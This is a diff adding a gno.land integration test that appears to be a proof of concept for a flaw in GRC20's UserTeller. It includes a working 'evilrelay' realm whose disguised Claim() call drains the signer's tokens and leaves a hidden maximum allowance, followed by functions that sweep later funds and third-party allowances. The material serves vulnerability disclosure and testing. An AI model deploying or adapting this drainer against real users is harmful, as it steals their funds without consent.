@@ -1,0 +1,186 @@
+# Asserts what the public Token.UserTeller() grants. Any realm a user reaches by
+# a direct MsgCall moves that user's whole balance in any registered token, with
+# no registration, no allowance and no relationship to the token realm, and can
+# leave itself a standing allowance the user never sees, spent later with no
+# further signature.
+# Measured at 16f54a89c: alice signs `evilrelay.Claim()` with no arguments and
+# her 1000000 VTOK plus the 400000 carol allowed her leave for the relay, which
+# then takes a later 100000 with no alice transaction at all.
+#
+# Run: from a local clone of gnolang/gno:
+# gh pr checkout 6123 -R gnolang/gno
+# cp grc20_userteller_unbounded_relay.txtar gno.land/pkg/integration/testdata/
+# go test -v -run 'TestTestdata/grc20_userteller_unbounded_relay' ./gno.land/pkg/integration/
+# rm gno.land/pkg/integration/testdata/grc20_userteller_unbounded_relay.txtar
+
+loadpkg gno.land/p/demo/tokens/grc20
+loadpkg gno.land/r/demo/defi/grc20reg
+loadpkg gno.land/r/test/vtok $WORK/vtok
+loadpkg gno.land/r/test/evilrelay $WORK/evilrelay
+
+adduser alice
+adduser carol
+
+gnoland start
+
+gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
+stdout 'OK!'
+gnokey maketx send -send 50000000ugnot -to $carol_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
+stdout 'OK!'
+
+# alice and carol each hold 1000000 VTOK.
+gnokey maketx call -pkgpath gno.land/r/test/vtok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+gnokey maketx call -pkgpath gno.land/r/test/vtok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test carol
+stdout OK
+gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$alice_user_addr\")"
+stdout '1000000 int64'
+
+# carol allows alice 400000, the ordinary allowance route.
+gnokey maketx call -pkgpath gno.land/r/demo/defi/grc20reg -func UserApprove -args gno.land/r/test/vtok.VTOK -args $alice_user_addr -args 400000 -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test carol
+stdout OK
+
+# The relay holds nothing before alice signs.
+gnokey query vm/qeval --data "gno.land/r/test/evilrelay.Take()"
+stdout '0 int64'
+
+# alice signs one MsgCall: pkgpath gno.land/r/test/evilrelay, func Claim, no
+# arguments. The signing view names no token, no amount and no recipient.
+gnokey maketx call -pkgpath gno.land/r/test/evilrelay -func Claim -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+
+gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$alice_user_addr\")"
+stdout '0 int64'         # IS:     a realm the user merely called spends her whole balance
+# stdout '1000000 int64' # SHOULD: a realm moves a user's tokens only within an allowance she granted it
+gnokey query vm/qeval --data "gno.land/r/test/evilrelay.Take()"
+stdout '1000000 int64'
+
+# The same call spends the allowance carol granted alice, because UserTeller
+# resolves the SPENDER from the frame too.
+gnokey maketx call -pkgpath gno.land/r/test/evilrelay -func ClaimBonus -args $carol_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$carol_user_addr\")"
+stdout '600000 int64'
+gnokey query vm/qeval --data "gno.land/r/test/evilrelay.Take()"
+stdout '1400000 int64'
+
+# Claim also left the relay a standing allowance on alice, which no wallet
+# screen showed her.
+gnokey query vm/qeval --data "gno.land/r/test/vtok.AllowanceOfRelay(\"$alice_user_addr\")"
+stdout '9223372036854775807 int64'
+
+# carol sends alice 100000 later on.
+gnokey maketx call -pkgpath gno.land/r/demo/defi/grc20reg -func UserTransfer -args gno.land/r/test/vtok.VTOK -args $alice_user_addr -args 100000 -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test carol
+stdout OK
+gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$alice_user_addr\")"
+stdout '100000 int64'
+
+# The relay takes it in a transaction carol signs, with alice absent: the
+# standing allowance outlives the one call alice made.
+gnokey maketx call -pkgpath gno.land/r/test/evilrelay -func Sweep -args $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test carol
+stdout OK
+gnokey query vm/qeval --data "gno.land/r/test/vtok.BalanceOf(\"$alice_user_addr\")"
+stdout '0 int64'
+gnokey query vm/qeval --data "gno.land/r/test/evilrelay.Take()"
+stdout '1500000 int64'
+
+-- vtok/gnomod.toml --
+module = "gno.land/r/test/vtok"
+gno = "0.9"
+
+-- vtok/vtok.gno --
+package vtok
+
+import (
+	"chain"
+
+	"gno.land/p/demo/tokens/grc20"
+	"gno.land/r/demo/defi/grc20reg"
+)
+
+var (
+	token *grc20.Token
+	adm   *grc20.PrivateLedger
+)
+
+// The token realm names no relay and grants nothing. Register is the only
+// thing it does beyond minting.
+func init(cur realm) {
+	token, adm = grc20.NewToken("VictimTok", "VTOK", 4, 0, cur)
+	grc20reg.Register(cross(cur), token, "")
+}
+
+func Faucet(cur realm) {
+	if err := adm.Mint(cur.Previous().Address(), 1_000_000); err != nil {
+		panic(err)
+	}
+}
+
+func BalanceOf(owner address) int64 { return token.BalanceOf(owner) }
+
+func AllowanceOfRelay(owner address) int64 {
+	return token.Allowance(owner, chain.PackageAddress("gno.land/r/test/evilrelay"))
+}
+
+-- evilrelay/gnomod.toml --
+module = "gno.land/r/test/evilrelay"
+gno = "0.9"
+
+-- evilrelay/evilrelay.gno --
+package evilrelay
+
+import (
+	"chain"
+	"math"
+
+	"gno.land/r/demo/defi/grc20reg"
+)
+
+const key = "gno.land/r/test/vtok.VTOK"
+
+// Claim advertises itself as an airdrop claim: a plain crossing function with
+// no parameters, so a wallet shows the signer "evilrelay.Claim()". This realm
+// imports only the registry; vtok has never heard of it.
+func Claim(cur realm) {
+	tok := grc20reg.MustGet(key)
+	victim := cur.Previous().Address()
+	me := cur.Address()
+	if bal := tok.BalanceOf(victim); bal > 0 {
+		if err := tok.UserTeller().Transfer(0, cur, me, bal); err != nil {
+			panic(err)
+		}
+	}
+	// Standing authority, so the next balance the victim receives is takeable
+	// without her signing anything again.
+	if err := tok.UserTeller().Approve(0, cur, me, math.MaxInt64); err != nil {
+		panic(err)
+	}
+}
+
+// ClaimBonus spends an allowance a third party granted the SIGNING USER: the
+// user is the spender the teller resolves from the frame.
+func ClaimBonus(cur realm, owner address) {
+	tok := grc20reg.MustGet(key)
+	amt := tok.Allowance(owner, cur.Previous().Address())
+	if amt == 0 {
+		return
+	}
+	if err := tok.UserTeller().TransferFrom(0, cur, owner, cur.Address(), amt); err != nil {
+		panic(err)
+	}
+}
+
+// Sweep draws on the standing allowance as the relay itself. Anyone can sign
+// it; the victim is not in the transaction.
+func Sweep(cur realm, victim address) {
+	tok := grc20reg.MustGet(key)
+	bal := tok.BalanceOf(victim)
+	if bal == 0 {
+		return
+	}
+	grc20reg.TransferFrom(0, cur, key, victim, cur.Address(), bal)
+}
+
+func Take() int64 {
+	return grc20reg.MustGet(key).BalanceOf(chain.PackageAddress("gno.land/r/test/evilrelay"))
+}
